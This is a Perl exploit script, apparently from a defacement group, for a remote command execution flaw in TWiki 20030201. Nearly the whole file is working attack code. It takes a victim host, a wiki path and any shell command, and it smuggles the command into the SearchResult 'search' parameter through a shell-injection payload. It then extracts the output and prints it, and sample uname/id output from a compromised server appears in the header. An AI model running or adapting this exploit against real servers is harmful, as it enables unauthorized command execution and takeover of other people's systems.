#!/usr/bin/perl
#
#   TWiki 20030201 VIEW string remote command execution vulnerability
#
#   Exploit coded by runvirus    GeekZ[at]WorldDefacers[d0t]NeT
#
#
#   [root@localhost perls]$ perl twikiview.pl -h www.victim.com -p twiki/bin/view/TWiki/ -c "uname -a;id"
#
#
#    -=[    TWiki :- view string remote command execution exploit  ]=-
#    -=[                      Coded by rUnViRuS                    ]=-
#    -=[    HOST:- www.worlddefacers.net www.secuirty-arab.com     ]=-
#
#     bash-2.05b --> uname -a;id
#
#       Linux infong225 2.4.28-grsec-20050113a #1 SMP Thu Jan 13 08:59:31 CET 2005 i686 unknown
#      uid=16704(u36561933) gid=600(ftpusers)
#
#

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
###########################################################################################
use Net::HTTP;
use Getopt::Std; getopts('h:p:c:', \%args);

if (defined($args{'h'})) { $host = $args{'h'}; }
if (defined($args{'p'})) { $path = $args{'p'}; }
if (defined($args{'c'})) { $thecmd = $args{'c'};}else{$thecmd = "uname -a;id";}
print STDERR "\n-=[ TWiki 20030201 VIEW string remote command execution vulnerability ]=-\n";
print STDERR "-=[      HOST:- www.worlddefacers.net www.secuirty-arab.com           ]=-\n";
print STDERR "-=[                         Coded by rUnViRuS                         ]=-\n\n";

if ((!defined($host)) || (!defined($path))) {
Usage();
}


 print "bash-2.05b --> $thecmd\n\n";
 my $s = Net::HTTP->new(Host => "$host") || die $@;
 my $thecmd=URLEncode($thecmd);
 my $count=0;
 my $skip=0;
 my $buf2;

 my $exploit="?topic=doesnotexist1%27%3B+%28$thecmd%29+%7C+sed+%27s%2F%5C%28.*%5C%29%2F__BEGIN__%5C1__END__.txt%2F%27%3B+fgrep+-i+-l+--+%27doesnotexist2";
  $s->write_request(GET => $path . "SearchResult?search=" . $exploit, 'User-Agent' => "Mozilla/5.0");
 my($code, $mess, %h) = $s->read_response_headers;

 #  ..,,;:: Procedura di parsing

 while (1) {
    my $buf;
    my $n = $s->read_entity_body($buf, 1024);
    die "read failed: $!" unless defined $n;
    last unless $n;
    $buf2 = $buf2 . $buf;
 }
    while (index($buf2,"__BEGIN__",$skip) != -1) {
          $from = index($buf2,"__BEGIN__",$skip);
          $count = $count +1;
          $from = $from + 9;
          $to = index($buf2,"__END__",$skip);
          $skip = $to+7;
          $chars = $to - $from;
          $grab  = substr($buf2, $from, $chars);
          if (($grab ne $oldgrab) && ($count != 1)){
             print "$grab\n";
             }
         $oldgrab = $grab;
        }
 if ( $count <= 1 ){
   print "Host not vulnerable\n";
 }

 #  ..,,;:: Procedura di encoding strarippata da snooq

sub URLEncode {
my $theURL=$_[0];
$theURL=~ s/([\W])/"%".uc(sprintf("%2.2x",ord($1)))/eg;
return $theURL;
}

sub Usage {
print STDERR "-=[        Options:    twikiview.pl -h www.exmpl.com -p                ]=-
-=[       -h Victim host  .  ]=-
-=[       -p Twiki path.     ]=-
-=[       -c Command.        ]=-\n\n";
exit;
}